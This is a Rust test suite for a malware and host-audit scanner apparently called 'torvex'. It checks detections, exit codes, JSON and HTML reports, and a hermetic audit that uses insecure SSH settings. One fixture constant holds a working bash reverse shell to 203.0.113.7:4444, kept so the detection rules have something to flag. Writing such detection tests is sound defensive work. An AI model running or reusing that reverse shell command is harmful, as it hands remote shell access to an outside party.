use std::fs;
use std::path::Path;
use std::process::{Command, Output};

use serde_json::Value;
use torvex::engine::{FailureKind, Verdict};
use torvex::scanner::{EngineSelection, ScanOptions, scan_path_with_options};

const RULES_DIR: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/rules");
const CLEAN_TEXT: &str = "ordinary harmless text";
const CLEAN_TEXT_SHA256: &str = "7118ca6e073e8945cab7573c5e6a181c48bd95135403320fdd2cb52b98ef7cbb";
const REVERSE_SHELL: &str = "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n";

fn scan_options() -> ScanOptions {
    ScanOptions {
        rules_dir: Some(RULES_DIR.into()),
        ..ScanOptions::default()
    }
}

fn write_fixture(path: &Path, contents: &str) {
    fs::write(path, contents).expect("write fixture");
}

fn run_cli(args: &[&str], current_dir: Option<&Path>) -> Output {
    let mut command = Command::new(env!("CARGO_BIN_EXE_torvex"));
    command.args(args);
    command.env_remove("TORVEX_RULES_DIR");
    command.env("NO_COLOR", "1");
    if let Some(directory) = current_dir {
        command.current_dir(directory);
    }
    command.output().expect("run torvex CLI")
}

fn stdout(output: &Output) -> String {
    String::from_utf8(output.stdout.clone()).expect("CLI stdout is UTF-8")
}

fn stderr(output: &Output) -> String {
    String::from_utf8(output.stderr.clone()).expect("CLI stderr is UTF-8")
}

fn python_available() -> bool {
    Command::new("python3")
        .arg("--version")
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

#[test]
fn scans_clean_and_demo_marker_files() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let clean_file = temp.path().join("clean.txt");
    let marker_file = temp.path().join("marker.txt");
    write_fixture(&clean_file, CLEAN_TEXT);
    write_fixture(&marker_file, "TORVEX_YARA_EXAMPLE_TEXT");

    let report =
        scan_path_with_options(temp.path(), &scan_options()).expect("scan fixture directory");

    assert_eq!(report.results.len(), 2);
    assert!(report.failures.is_empty());
    assert!(report.is_complete());
    assert_eq!(report.skipped, 0);
    assert!(
        report.rules.rule_count >= 15,
        "the bundled rule pack should be substantive, got {}",
        report.rules.rule_count
    );
    assert_eq!(report.rules.demo_rule_count, 3);
    assert!(!report.rules.is_demo_only());
    assert!(report.has_findings());
    assert_eq!(report.schema, "torvex.report.v2");

    let clean = report
        .results
        .iter()
        .find(|result| result.path == clean_file.to_string_lossy())
        .expect("clean result");
    assert_eq!(clean.verdict, Verdict::Clean);
    assert_eq!(clean.sha256, CLEAN_TEXT_SHA256);
    assert_eq!(clean.size, CLEAN_TEXT.len() as u64);
    assert_eq!(clean.file_type.as_deref(), Some("text/plain"));
    assert!(clean.matches.is_empty());
    assert!(!clean.is_suspicious());

    let marker = report
        .results
        .iter()
        .find(|result| result.path == marker_file.to_string_lossy())
        .expect("marker result");
    assert_eq!(marker.verdict, Verdict::Suspicious);
    assert_eq!(marker.sha256.len(), 64);
    assert_eq!(marker.matches.len(), 1);
    assert_eq!(marker.matches[0].rule, "torvex_example_text");
    assert!(marker.matches[0].demo);
    assert_eq!(marker.matches[0].level, 3);
    assert!(marker.matches[0].tags.contains(&"demo".to_owned()));

    let summary = report.summary();
    assert_eq!(summary.scanned, 2);
    assert_eq!(summary.clean, 1);
    assert_eq!(summary.suspicious, 1);
    assert_eq!(summary.errors, 0);
    assert_eq!(summary.by_severity.get("low"), Some(&1));
    // Demo fixtures must not contribute risk points.
    assert_eq!(summary.risk_score, 0);
}

#[test]
fn reverse_shell_triggers_native_and_correlated_findings() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let script = temp.path().join("shell.sh");
    write_fixture(&script, REVERSE_SHELL);

    let report = scan_path_with_options(&script, &scan_options()).expect("scan");
    let ids = report
        .findings
        .iter()
        .map(|finding| finding.id.as_str())
        .collect::<Vec<_>>();

    assert!(report.engines.native);
    assert!(report.engines.native_rules >= 30);
    assert!(ids.contains(&"TVX-NAT-007"), "{ids:?}");
    assert!(ids.contains(&"TVX-NAT-008"), "{ids:?}");
    assert!(ids.contains(&"tvx_reverse_shell"), "{ids:?}");
    assert!(
        ids.iter().any(|id| id.starts_with("TVX-CORR")),
        "compound rules should fire: {ids:?}"
    );
    assert!(report.correlated >= 1);
    assert_eq!(report.summary.risk_score, 100);

    let finding = report
        .findings
        .iter()
        .find(|finding| finding.id == "TVX-NAT-008")
        .expect("reverse shell finding");
    assert_eq!(finding.severity.level(), 10);
    assert!(!finding.mitre.is_empty());
    assert!(!finding.evidence.is_empty());
    assert!(finding.remediation.is_some());

    let analysis = report.results[0]
        .analysis
        .as_ref()
        .expect("native analysis");
    assert_eq!(analysis.kind.as_deref(), Some("script"));
    assert!(analysis.iocs.iter().any(|ioc| ioc.value == "203.0.113.7"));
    assert!(analysis.entropy > 3.0);
}

#[test]
fn engines_can_be_selected_independently() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let script = temp.path().join("shell.sh");
    write_fixture(&script, REVERSE_SHELL);

    let yara_only = scan_path_with_options(
        &script,
        &ScanOptions {
            engines: EngineSelection {
                yara: true,
                native: false,
                audit: false,
            },
            ..scan_options()
        },
    )
    .expect("scan");
    assert!(!yara_only.engines.native);
    assert!(
        yara_only
            .findings
            .iter()
            .all(|finding| finding.source != torvex::findings::Source::Native)
    );

    let native_only = scan_path_with_options(
        &script,
        &ScanOptions {
            engines: EngineSelection {
                yara: false,
                native: true,
                audit: false,
            },
            ..scan_options()
        },
    )
    .expect("scan");
    assert!(!native_only.engines.yara);
    assert!(native_only.results[0].analysis.is_some());
    assert!(
        native_only
            .findings
            .iter()
            .all(|finding| finding.source != torvex::findings::Source::Yara)
    );
}

#[test]
fn detects_file_types_from_content_before_extension() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let disguised_png = temp.path().join("picture.txt");
    let html_file = temp.path().join("page.html");
    let mut png = vec![0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A];
    png.extend_from_slice(&[0_u8; 32]);
    fs::write(&disguised_png, png).expect("write PNG fixture");
    write_fixture(&html_file, "ordinary harmless text");

    let report =
        scan_path_with_options(temp.path(), &scan_options()).expect("scan fixture directory");

    let png_result = report
        .results
        .iter()
        .find(|result| result.path == disguised_png.to_string_lossy())
        .expect("PNG result");
    assert_eq!(png_result.file_type.as_deref(), Some("image/png"));

    let html_result = report
        .results
        .iter()
        .find(|result| result.path == html_file.to_string_lossy())
        .expect("HTML result");
    assert_eq!(html_result.file_type.as_deref(), Some("text/html"));
}

#[test]
fn missing_scan_root_is_a_startup_error() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let missing = temp.path().join("does-not-exist");

    let error =
        scan_path_with_options(&missing, &scan_options()).expect_err("missing root must fail");
    assert!(format!("{error:#}").contains("cannot access"));
}

#[cfg(unix)]
#[test]
fn unreadable_files_are_reported_and_the_scan_continues() {
    use std::os::unix::fs::PermissionsExt;

    let temp = tempfile::tempdir().expect("create temporary directory");
    let locked = temp.path().join("locked.txt");
    let readable = temp.path().join("readable.txt");
    write_fixture(&locked, CLEAN_TEXT);
    write_fixture(&readable, CLEAN_TEXT);
    fs::set_permissions(&locked, fs::Permissions::from_mode(0o000))
        .expect("make fixture unreadable");

    if fs::File::open(&locked).is_ok() {
        // Privileged test runners can read mode 000 files.
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o644))
            .expect("restore fixture permissions");
        return;
    }

    let report =
        scan_path_with_options(temp.path(), &scan_options()).expect("scan fixture directory");
    fs::set_permissions(&locked, fs::Permissions::from_mode(0o644))
        .expect("restore fixture permissions");

    assert_eq!(report.results.len(), 1);
    assert_eq!(report.results[0].path, readable.to_string_lossy());
    assert_eq!(report.failures.len(), 1);
    assert_eq!(report.failures[0].path, locked.to_string_lossy());
    assert_eq!(report.failures[0].kind, FailureKind::Read);
    assert!(!report.failures[0].error.is_empty());
    assert!(!report.is_complete());
}

#[cfg(unix)]
#[test]
fn directory_scans_skip_symlinks_but_explicit_symlinks_work() {
    use std::os::unix::fs::symlink;

    let temp = tempfile::tempdir().expect("create temporary directory");
    let real = temp.path().join("real.txt");
    let link = temp.path().join("link.txt");
    write_fixture(&real, CLEAN_TEXT);
    symlink(&real, &link).expect("create symlink");

    let directory_report =
        scan_path_with_options(temp.path(), &scan_options()).expect("scan fixture directory");
    assert_eq!(directory_report.results.len(), 1);
    assert_eq!(directory_report.skipped, 1);
    assert_eq!(directory_report.results[0].path, real.to_string_lossy());

    let explicit_report =
        scan_path_with_options(&link, &scan_options()).expect("scan explicit symlink");
    assert_eq!(explicit_report.results.len(), 1);
    assert_eq!(explicit_report.results[0].path, link.to_string_lossy());
}

#[test]
fn cli_reports_findings_with_exit_status_one() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    write_fixture(&temp.path().join("clean.txt"), CLEAN_TEXT);
    write_fixture(&temp.path().join("marker.txt"), "TORVEX_YARA_EXAMPLE_TEXT");

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
        ],
        None,
    );

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let text = stdout(&output);
    assert!(text.contains("Scanned  2 files"), "{text}");
    assert!(text.contains("Findings (1)"), "{text}");
    assert!(text.contains("torvex_example_text"), "{text}");
    assert!(text.contains("demo fixture"), "{text}");
    assert!(text.contains("YARA"), "{text}");
    assert!(text.contains("not an antivirus"), "{text}");
    assert!(stderr(&output).contains("demo fixtures"));
}

#[test]
fn cli_returns_zero_for_a_clean_scan() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    write_fixture(&temp.path().join("clean.txt"), CLEAN_TEXT);

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
        ],
        None,
    );

    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    let text = stdout(&output);
    assert!(text.contains("No findings."), "{text}");
    assert!(text.contains("not an antivirus"), "{text}");
}

#[test]
fn cli_fail_on_raises_the_bar() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    write_fixture(&temp.path().join("marker.txt"), "TORVEX_YARA_EXAMPLE_TEXT");

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
            "--fail-on",
            "high",
        ],
        None,
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "low demo finding must not fail"
    );

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
            "--fail-on",
            "none",
        ],
        None,
    );
    assert_eq!(output.status.code(), Some(0));

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 path"),
            "--fail-on",
            "nonsense",
        ],
        None,
    );
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("invalid --fail-on"));
}

#[test]
fn cli_json_report_is_machine_readable() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    write_fixture(&temp.path().join("marker.txt"), "TORVEX_YARA_EXAMPLE_TEXT");

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
            "--json",
        ],
        None,
    );

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));

    let report: Value = serde_json::from_slice(&output.stdout).expect("stdout is valid JSON");
    assert_eq!(report["tool"], "torvex");
    assert_eq!(report["schema"], "torvex.report.v2");
    assert_eq!(report["version"], env!("CARGO_PKG_VERSION"));
    assert_eq!(report["summary"]["scanned"], 1);
    assert_eq!(report["summary"]["suspicious"], 1);
    assert_eq!(report["summary"]["errors"], 0);
    assert_eq!(report["summary"]["findings"], 1);
    assert_eq!(report["failures"].as_array().unwrap().len(), 0);
    assert_eq!(report["rules"]["demo_rule_count"], 3);
    assert_eq!(report["engines"]["native"], true);
    assert_eq!(report["results"][0]["verdict"], "suspicious");
    assert_eq!(
        report["results"][0]["matches"][0]["rule"],
        "torvex_example_text"
    );
    assert_eq!(report["results"][0]["matches"][0]["demo"], true);
    assert_eq!(report["results"][0]["matches"][0]["engine"], "yara");
    assert!(report["results"][0].get("confidence").is_none());
    assert!(report["results"][0].get("status").is_none());
    assert!(report["findings"][0]["severity"].is_string());
}

#[cfg(unix)]
#[test]
fn cli_json_reports_unreadable_files_and_exit_status_two() {
    use std::os::unix::fs::PermissionsExt;

    let temp = tempfile::tempdir().expect("create temporary directory");
    let locked = temp.path().join("locked.txt");
    let readable = temp.path().join("readable.txt");
    write_fixture(&locked, CLEAN_TEXT);
    write_fixture(&readable, CLEAN_TEXT);
    fs::set_permissions(&locked, fs::Permissions::from_mode(0o000))
        .expect("make fixture unreadable");

    if fs::File::open(&locked).is_ok() {
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o644))
            .expect("restore fixture permissions");
        return;
    }

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
            "--json",
        ],
        None,
    );
    fs::set_permissions(&locked, fs::Permissions::from_mode(0o644))
        .expect("restore fixture permissions");

    assert_eq!(output.status.code(), Some(2), "stderr: {}", stderr(&output));
    let report: Value = serde_json::from_slice(&output.stdout).expect("stdout is valid JSON");
    assert_eq!(report["summary"]["scanned"], 1);
    assert_eq!(report["summary"]["errors"], 1);
    assert_eq!(report["failures"][0]["kind"], "read");
}

#[test]
fn cli_loads_a_custom_rules_directory() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let rules_dir = temp.path().join("custom-rules");
    let scan_dir = temp.path().join("scan");
    fs::create_dir(&rules_dir).expect("create rules directory");
    fs::create_dir(&scan_dir).expect("create scan directory");
    write_fixture(
        &rules_dir.join("custom.yar"),
        r#"
rule torvex_test_custom
{
    meta:
        description = "Test-only custom marker"
        severity = "high"
    strings:
        $marker = "TORVEX_CUSTOM_TEST_MARKER"
    condition:
        $marker
}
"#,
    );
    write_fixture(&scan_dir.join("sample.txt"), "TORVEX_CUSTOM_TEST_MARKER");

    let output = run_cli(
        &[
            "scan",
            scan_dir.to_str().expect("UTF-8 temporary path"),
            "--rules",
            rules_dir.to_str().expect("UTF-8 temporary path"),
        ],
        None,
    );

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let text = stdout(&output);
    assert!(text.contains("torvex_test_custom"));
    assert!(!text.contains("demo fixtures are harmless"));
}

#[test]
fn cli_falls_back_to_embedded_demo_rules() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    write_fixture(&temp.path().join("marker.txt"), "TORVEX_YARA_EXAMPLE_TEXT");

    let output = run_cli(
        &["scan", temp.path().to_str().expect("UTF-8 temporary path")],
        Some(temp.path()),
    );

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let text = stdout(&output);
    assert!(text.contains("embedded demo rules"));
    assert!(text.contains("torvex_example_text"));
}

#[test]
fn cli_discovers_rules_in_the_current_directory() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let rules_dir = temp.path().join("rules");
    fs::create_dir(&rules_dir).expect("create rules directory");
    write_fixture(
        &rules_dir.join("custom.yar"),
        r#"
rule torvex_test_cwd
{
    strings:
        $marker = "TORVEX_CWD_RULE_MARKER"
    condition:
        $marker
}
"#,
    );
    write_fixture(&temp.path().join("sample.txt"), "TORVEX_CWD_RULE_MARKER");

    let output = run_cli(
        &["scan", temp.path().to_str().expect("UTF-8 temporary path")],
        Some(temp.path()),
    );

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(stdout(&output).contains("torvex_test_cwd"));
}

#[test]
fn cli_missing_root_and_bad_rules_exit_with_code_two() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let missing = temp.path().join("missing");

    let output = run_cli(
        &[
            "scan",
            missing.to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
        ],
        None,
    );
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("error:"));

    let empty_rules = temp.path().join("empty-rules");
    fs::create_dir(&empty_rules).expect("create empty rules directory");
    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            empty_rules.to_str().expect("UTF-8 temporary path"),
        ],
        None,
    );
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("no .yar or .yara rule files"));
}

#[test]
fn cli_writes_an_html_dashboard() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    write_fixture(&temp.path().join("shell.sh"), REVERSE_SHELL);
    let target = temp.path().join("report.html");

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
            "--format",
            "html",
            "--output",
            target.to_str().expect("UTF-8 temporary path"),
        ],
        None,
    );

    assert!(
        output.status.code() == Some(1) || output.status.code() == Some(0),
        "stderr: {}",
        stderr(&output)
    );
    let html = fs::read_to_string(&target).expect("read html");
    assert!(html.starts_with("<!doctype html>"));
    assert!(html.contains("TORVE"));
    assert!(html.contains("TVX-NAT-008"));
    assert!(html.contains("const WEB = false;"));
    assert!(!html.contains("http://cdn"));
}

#[test]
fn cli_rerenders_a_saved_json_report() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    write_fixture(&temp.path().join("shell.sh"), REVERSE_SHELL);
    let json_path = temp.path().join("report.json");
    let html_path = temp.path().join("rerendered.html");

    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
            "--json",
            "--output",
            json_path.to_str().expect("UTF-8 temporary path"),
        ],
        None,
    );
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));

    let output = run_cli(
        &[
            "report",
            json_path.to_str().expect("UTF-8 temporary path"),
            "--output",
            html_path.to_str().expect("UTF-8 temporary path"),
        ],
        None,
    );
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    let html = fs::read_to_string(&html_path).expect("read html");
    assert!(html.contains("TVX-NAT-008"));
}

#[test]
fn cli_rules_and_info_commands_work() {
    let output = run_cli(&["rules", "list", "--rules", RULES_DIR], None);
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    let text = stdout(&output);
    assert!(text.contains("torvex_example_text"));
    assert!(text.contains("demo fixture"));
    assert!(text.contains("tvx_reverse_shell"));

    let output = run_cli(&["rules", "validate", "--rules", RULES_DIR], None);
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    assert!(stdout(&output).contains("OK:"));

    let output = run_cli(&["info"], None);
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    let text = stdout(&output);
    assert!(text.contains("torvex-native"));
    assert!(text.contains("Correlation:"));
}

#[test]
fn cli_version_prints_the_package_version() {
    let output = run_cli(&["version"], None);
    assert_eq!(output.status.code(), Some(0));
    assert!(stdout(&output).contains(env!("CARGO_PKG_VERSION")));
}

#[test]
fn cli_rejects_an_unknown_format() {
    let temp = tempfile::tempdir().expect("create temporary directory");
    let output = run_cli(
        &[
            "scan",
            temp.path().to_str().expect("UTF-8 temporary path"),
            "--format",
            "yaml",
        ],
        None,
    );
    assert_eq!(output.status.code(), Some(2));
}

#[test]
fn cli_audits_a_hermetic_root() {
    if !python_available() {
        eprintln!("skipping: python3 is unavailable");
        return;
    }

    let temp = tempfile::tempdir().expect("create temporary directory");
    let root = temp.path();
    fs::create_dir_all(root.join("etc/ssh")).expect("create etc/ssh");
    write_fixture(
        &root.join("etc/ssh/sshd_config"),
        "PermitRootLogin yes\nPasswordAuthentication yes\nPermitEmptyPasswords yes\n",
    );
    write_fixture(
        &root.join("etc/passwd"),
        "root:x:0:0:root:/root:/bin/bash\n",
    );
    write_fixture(&root.join("etc/shadow"), "root:*:19000:0:99999:7:::\n");
    write_fixture(&root.join("etc/os-release"), "ID=test\nVERSION_ID=\"1\"\n");

    let output = run_cli(
        &[
            "audit",
            "--root",
            root.to_str().expect("UTF-8 temporary path"),
            "--json",
            "--fail-on",
            "high",
        ],
        None,
    );

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report: Value = serde_json::from_slice(&output.stdout).expect("audit JSON");
    assert_eq!(report["engines"]["audit"], true);
    assert_eq!(report["audit"]["schema"], "torvex.audit.v1");
    assert_eq!(report["audit"]["live"], false);
    assert!(report["audit"]["results"].as_array().unwrap().len() > 20);
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "SSH-7401")
    );
    assert!(report["summary"]["audit_index"].is_number());
}

#[test]
fn cli_scan_can_include_the_host_audit() {
    if !python_available() {
        eprintln!("skipping: python3 is unavailable");
        return;
    }

    let temp = tempfile::tempdir().expect("create temporary directory");
    let root = temp.path();
    fs::create_dir_all(root.join("etc")).expect("create etc");
    write_fixture(&root.join("etc/os-release"), "ID=test\n");
    write_fixture(&root.join("sample.txt"), CLEAN_TEXT);

    let output = run_cli(
        &[
            "scan",
            root.to_str().expect("UTF-8 temporary path"),
            "--rules",
            RULES_DIR,
            "--audit",
            "--audit-root",
            root.to_str().expect("UTF-8 temporary path"),
            "--json",
        ],
        None,
    );

    let report: Value = serde_json::from_slice(&output.stdout).expect("scan JSON");
    assert_eq!(report["engines"]["audit"], true);
    assert_eq!(report["audit"]["root"], root.to_string_lossy().as_ref());
    assert!(report["summary"]["audit_index"].is_number());
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["source"] == "audit")
    );
}
